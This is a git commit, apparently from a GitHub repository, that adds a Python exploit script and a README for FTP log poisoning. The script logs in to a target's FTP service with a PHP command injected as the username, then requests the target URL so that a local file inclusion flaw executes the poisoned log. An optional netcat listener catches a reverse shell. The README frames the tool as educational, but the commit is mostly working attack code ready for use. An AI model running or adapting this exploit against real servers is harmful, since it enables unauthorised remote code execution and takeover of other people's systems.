fdc6c8fe70b2971d6a23dd6acfb0f058ced5c264
Infrar3dd <evfedorius@yandex.ru>
2026-02-21 14:51:20 +0300

    new file:   Example.jpg 	modified:   README.md 	new file:   ftp_log_poisoning.py

--- README.md
+++ README.md
@@ -1,2 +1,35 @@
 # FTP-Log-Poisoning
-FTP-Log-Poisoning Exploit
+
+xpl0ited by [infrar3d](https://github.com/Infrar3dd)
+
+**FTP Log Poisoning** is a vulnerability which works in tandem with **LFI**
+
+It works if text from LFI was read like a PHP code.
+
+```bash
+python3 ftp_log_poisoning.py --help
+usage: ftp_log_poisoning.py [-h] -u URL -p PORT -c COMMAND [--shell] [-l LPORT]
+
+FTP Log Poisoning exploit
+
+options:
+  -h, --help            show this help message and exit
+  -u, --url URL         Target URL
+  -p, --port PORT       FTP port
+  -c, --command COMMAND
+                        Command to execute
+  --shell               Open shell
+  -l, --lport LPORT     Listen port
+
+```
+Example:
+
+### ⚠️ Disclaimer ⚠️
+
+This software and proof-of-concept code is provided **for educational and research purposes only**. 
+
+*   The authors are **not responsible** for any misuse or damage caused by this program.
+*   **Do not use** against any systems without explicit **prior permission**.
+*   Use of this tools for attacking targets without consent is **illegal**.
+
+You are responsible for obeying all applicable laws. **Use ethically and responsibly.**
---
+++ ftp_log_poisoning.py
@@ -0,0 +1,50 @@
+#!/usr/bin/env python3
+from ftplib import FTP
+import subprocess
+import threading
+import argparse
+from urllib.parse import urlparse
+
+
+def start_nc(lport):
+    subprocess.run(["nc", "-lvnp", str(lport)])
+
+def read_logs(url): 
+     subprocess.run(["curl", "-s", url], check=False)
+
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description='FTP Log Poisoning exploit')
+    parser.add_argument('-u','--url', required=True, help='Target URL')
+    parser.add_argument('-p','--port', required=True, help='FTP port', type=int)
+    parser.add_argument('-c','--command', required=True, help='Command to execute')
+    parser.add_argument('--shell',  action='store_true', help='Open shell')
+    parser.add_argument('-l','--lport', help='Listen port', type=int)
+    args = parser.parse_args()
+
+
+    url = args.url
+    host = urlparse(url).hostname
+    ftp_port = args.port
+    command = args.command
+
+    username = f"<?=`{command}`?>"     
+    password = "a"    
+
+    if args.shell:
+        if not args.lport:
+            parser.error("[-] No Listen port")
+        else:
+            threading.Thread(target=start_nc,args=(args.lport,)).start()
+
+    try:
+        print(f"[*] Trying USERNAME: {username} | PASSWORD: {password}")
+        ftp = FTP()
+        ftp.connect(host, ftp_port)
+        ftp.login(user=username, passwd=password)
+        ftp.quit()
+    except:
+        print("[✓] Done")
+
+    read_logs(url)
+
